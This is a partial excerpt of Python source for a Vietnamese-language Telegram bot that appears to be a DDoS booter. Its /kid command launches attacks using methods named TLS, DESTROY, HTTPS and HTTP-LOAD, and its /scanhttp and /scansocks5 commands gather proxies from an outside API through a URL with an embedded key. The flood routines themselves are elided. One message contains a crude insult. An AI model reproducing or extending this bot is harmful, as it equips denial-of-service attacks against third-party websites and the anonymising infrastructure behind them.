...
- /scanhttp : Để update proxy bằng api 💸
- /scansocks5 : Để update proxy bằng api 💸
+-------,------------------------,----,----------,
| |||||  `_-_-_-_-_-_-_-_-_-'    |          O
` +--------------------------------------------|
   `\___,----------,-----------,-----------------'
...
@bot.message_handler(commands=['kid'])
def attack_command(message):
    ...
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 1:
        ...
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /kid.")
        return
    ...
    if method == 'TLS' or method == 'DESTROY' or method == 'HTTPS'  or method == 'HTTP-TLS' or method == 'HTTP-LOAD' :
...
@bot.message_handler(commands=['scanhttp'])
def handle_scan(message):
    try:
        # Lấy số lần muốn scan từ tin nhắn của người dùng
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Vui lòng nhập số lần muốn scan, ví dụ: /scanhttp ")
            return
        ...
        bot.send_message(message.chat.id, 'Update xng r nha thk buồi')

    except Exception as e:
        bot.send_message(message.chat.id, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['scansocks5'])
def handle_scan(message):
    try:
        # Lấy số lần muốn scan từ tin nhắn của người dùng
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Vui lòng nhập số lần muốn scan, ví dụ: /scansocks5 5")
            return

        num_scans = int(args[1])
        proxy_list = []

        api_url = 'https://api.thanhdieu.com/get-proxy.php?classify=socks5&key=binhvn'
